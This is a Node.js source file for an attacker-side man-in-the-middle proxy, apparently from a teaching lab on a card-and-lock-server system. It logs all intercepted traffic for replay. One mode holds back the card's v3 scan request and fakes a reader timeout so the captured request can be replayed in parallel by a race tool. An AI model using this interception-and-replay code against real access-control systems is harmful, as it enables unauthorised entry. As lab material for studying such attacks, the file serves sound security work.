// ─────────────────────────────────────────────────────────────────────────────
// attacker/proxy.js – Man-in-the-Middle (MitM) traffic interceptor
//
// A simple HTTP proxy that sits between the card and the lock server.
// It intercepts all traffic on port 3001, appends the requests and responses
// to an append-only JSONL log (capture.jsonl) for offline analysis/replay,
// and then forwards the traffic to the real server on port 3000.
//
// The `--hold-v3` flag simulates an attacker who blocks the message in
// transit. It captures the card's POST /api/v3/scan but does NOT forward
// it to the server. The attacker can then use the `race` tool to send many
// copies in parallel.
//
// Security concept: eavesdropping, inline interception, and message-blocking
// vectors in wireless or unencrypted networks.
// ─────────────────────────────────────────────────────────────────────────────

import http from 'node:http';
import fs   from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const capturePath = path.join(__dirname, 'capture.jsonl');

const TARGET_HOST = '127.0.0.1';
const TARGET_PORT = 3000;
const LISTEN_PORT = 3001;

const holdV3 = process.argv.includes('--hold-v3');

/** Write an intercepted transaction to the log. */
function safeJsonParse(buf) {
  if (!buf || buf.length === 0) return null;
  const str = buf.toString().trim();
  if (!str) return null;
  try {
    return JSON.parse(str);
  } catch {
    return str;
  }
}

function logTransaction(req, reqBuffer, status, resBuffer) {
  const entry = {
    timestamp: new Date().toISOString(),
    method: req.method,
    url: req.url,
    reqBody: safeJsonParse(reqBuffer),
    resStatus: status,
    resBody: safeJsonParse(resBuffer)
  };
  fs.appendFileSync(capturePath, JSON.stringify(entry) + '\n');
  console.log(`[Proxy] Captured ${req.method} ${req.url}`);
}

const server = http.createServer((clientReq, clientRes) => {
  let reqData = [];
  clientReq.on('data', chunk => reqData.push(chunk));
  clientReq.on('end', () => {
    const reqBuffer = Buffer.concat(reqData);

    // ── HOLD ATTACK logic ────────────────────────────────────────────────
    if (holdV3 && clientReq.method === 'POST' && clientReq.url.includes('/api/v3/scan')) {
      console.log(`[Proxy] HOLDING v3 scan request. Will not forward to server.`);
      // Fake a timeout response to the card
      const fakeRes = Buffer.from(JSON.stringify({ error: 'reader timeout' }));
      logTransaction(clientReq, reqBuffer, 504, fakeRes);
      
      clientRes.writeHead(504, { 'Content-Type': 'application/json' });
      clientRes.end(fakeRes);
      return;
    }

    // ── Normal forwarding ────────────────────────────────────────────────
    const options = {
      hostname: TARGET_HOST,
      port: TARGET_PORT,
      path: clientReq.url,
      method: clientReq.method,
      headers: clientReq.headers
    };
    
    // We must reset the host header so the express server doesn't get confused
    options.headers['host'] = `${TARGET_HOST}:${TARGET_PORT}`;

    const proxyReq = http.request(options, (proxyRes) => {
      let resData = [];
      proxyRes.on('data', chunk => resData.push(chunk));
      proxyRes.on('end', () => {
        const resBuffer = Buffer.concat(resData);
        logTransaction(clientReq, reqBuffer, proxyRes.statusCode, resBuffer);
        
        clientRes.writeHead(proxyRes.statusCode, proxyRes.headers);
        clientRes.end(resBuffer);
      });
    });

    proxyReq.on('error', (err) => {
      console.error(`[Proxy] Forwarding error: ${err.message}`);
      clientRes.writeHead(502);
      clientRes.end('Proxy Error');
    });

    if (reqBuffer.length > 0) {
      proxyReq.write(reqBuffer);
    }
    proxyReq.end();
  });
});

server.listen(LISTEN_PORT, '127.0.0.1', () => {
  console.log(`[Proxy] Listening on http://127.0.0.1:${LISTEN_PORT} -> forwarding to :${TARGET_PORT}`);
  if (holdV3) console.log(`[Proxy] HOLDING POST /api/v3/scan traffic for race demo.`);
});
